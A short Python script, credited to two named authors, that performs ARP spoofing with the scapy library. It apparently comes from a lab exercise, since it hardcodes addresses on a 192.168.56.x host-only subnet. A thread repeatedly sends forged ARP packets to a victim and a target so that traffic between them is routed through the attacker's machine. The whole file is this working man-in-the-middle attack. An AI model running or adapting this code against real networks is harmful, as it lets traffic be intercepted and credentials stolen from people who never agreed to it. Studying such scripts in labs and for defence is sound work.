# script for ARP spoofing
# written by Abdel K. Bokharouss and Adriaan Knapen
import threading
from scapy.all import *
from scapy.layers.l2 import ARP, Ether
import sys
from time import sleep


class ArpSpoof(threading.Thread):
    vIP = '192.168.56.101'
    tIP = '192.168.56.102'
    oIP = '192.168.56.103'

    """
    Return own mac_addresss
    @rtype: str
    @return: mac address
    """

    def get_own_mac_address(self):
        macs = [get_if_hwaddr(i) for i in get_if_list()]
        for mac in macs:
            if mac != "00:00:00:00:00:00":
                return mac
        raise Exception("Failed to obtain local mac address")

    def spoof_arp(self, own_mac, victim_ip, target_ip):
        sendp([
            Ether() / ARP(op="who-has", hwsrc=own_mac, psrc=target_ip, pdst=victim_ip),
            Ether() / ARP(op="who-has", hwsrc=own_mac, psrc=victim_ip, pdst=target_ip)])

    def __init__(self, group=None, target=None, name=None, args=(), kwargs=None, verbose=None):
        threading.Thread.__init__(self)

    def run(self):
        print('aaaaa')
        try:
            attacker_mac = self.get_own_mac_address()
        except Exception as e:
            print(e)
            sys.exit(1)
        # fill_arp_cache(attacker_mac, vIP, tIP)  # <= 1 execution
        # time.sleep(2)
        while True:
            self.spoof_arp(attacker_mac, self.vIP, self.tIP)
            sleep(10)
